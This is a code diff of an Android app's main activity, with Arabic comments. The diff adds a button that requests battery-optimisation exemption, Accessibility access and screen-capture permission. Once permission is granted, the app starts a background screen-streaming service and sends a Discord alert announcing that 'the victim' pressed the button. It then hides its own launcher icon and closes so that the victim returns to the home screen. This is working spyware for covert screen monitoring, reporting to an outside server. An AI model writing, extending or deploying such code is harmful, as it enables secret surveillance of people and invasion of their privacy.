@@ -10,6 +10,8 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.view.View;
+import android.widget.Button;
 import androidx.appcompat.app.AppCompatActivity;
 
 public class MainActivity extends AppCompatActivity {
@@ -18,39 +20,43 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main); // تشغيل الواجهة الجديدة
 
-        // 1. طلب تجاهل تحسين البطارية لضمان العمل 24 ساعة
-        requestBatteryOptimizations();
+        Button btnStart = findViewById(R.id.btnStart);
+        btnStart.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                // 1. طلب تجاهل البطارية
+                requestBatteryOptimizations();
 
-        // 2. طلب إذن إمكانية الوصول (Accessibility)
-        if (!isAccessibilityEnabled(this)) {
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-        }
+                // 2. فتح إعدادات إمكانية الوصول (Accessibility)
+                Intent intentAcc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivity(intentAcc);
 
-        // 3. طلب إذن بث الشاشة
-        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        if (mpm != null) {
-            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
-        }
+                // 3. طلب بث الشاشة
+                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+                if (mpm != null) {
+                    startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
+                }
+            }
+        });
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            // أ. تشغيل الخدمة بالخلفية للبث المستمر
+            // تشغيل خدمة البث
             Intent intent = new Intent(this, ScreenService.class);
             intent.putExtra("resCode", resultCode);
             intent.putExtra("resData", data);
             startForegroundService(intent);
 
-            // ب. إرسال إشعار للديسكورد فوراً (الرابط موجود في DiscordSender)
-            DiscordSender.sendMessage("🚀 تم صيد ضحية جديدة! البث بدأ الآن على سيرفر Hussein Monitor.");
+            // إرسال إشعار للديسكورد
+            DiscordSender.sendMessage("🚀 الضحية ضغط على الزر! البث بدأ الآن.");
 
-            // ج. إخفاء الأيقونة فوراً من الجهاز
+            // إخفاء الأيقونة فوراً
             hideAppIcon();
-            
-            // د. إغلاق الواجهة فوراً ليعود الضحية للشاشة الرئيسية
             finish();
         }
     }
@@ -70,9 +76,5 @@ public class MainActivity extends AppCompatActivity {
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
         }
-    }
-
-    private boolean isAccessibilityEnabled(Context context) {
-        return false; // يفضل دائماً أن يفعله المستخدم يدوياً من الإعدادات
     }
 }
